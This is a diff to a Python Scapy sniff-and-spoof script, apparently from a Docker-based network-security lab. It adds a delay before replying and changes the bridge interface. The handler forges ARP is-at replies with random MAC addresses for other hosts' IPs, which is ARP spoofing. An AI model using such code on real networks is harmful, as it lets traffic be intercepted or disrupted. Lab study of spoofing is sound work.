@@ -32,6 +32,8 @@ def spoofing(pkt):
         # packet.show()
     
     elif pkt.haslayer(ARP) and pkt[ARP].op == ARP_WHO_HAS:
+        
+        time.sleep(1)
 
         arp = ARP(op = ARP_IS_AT, plen = 4, hwlen = 6, hwsrc = random_mac(), hwdst = pkt[ARP].hwsrc, psrc = pkt[ARP].pdst, pdst = pkt[ARP].psrc)
         print(f"ARP request from {pkt[ARP].psrc} to {pkt[ARP].pdst}\nSending reply")
@@ -41,4 +43,4 @@ def spoofing(pkt):
         # arp.show()
 
 
-pkt_icmp = sniff(iface='br-010be9e6617f:', filter='icmp || arp', prn=spoofing)
+pkt_icmp = sniff(iface='br-d86ec7a3cd9b:', filter='icmp || arp', prn=spoofing)
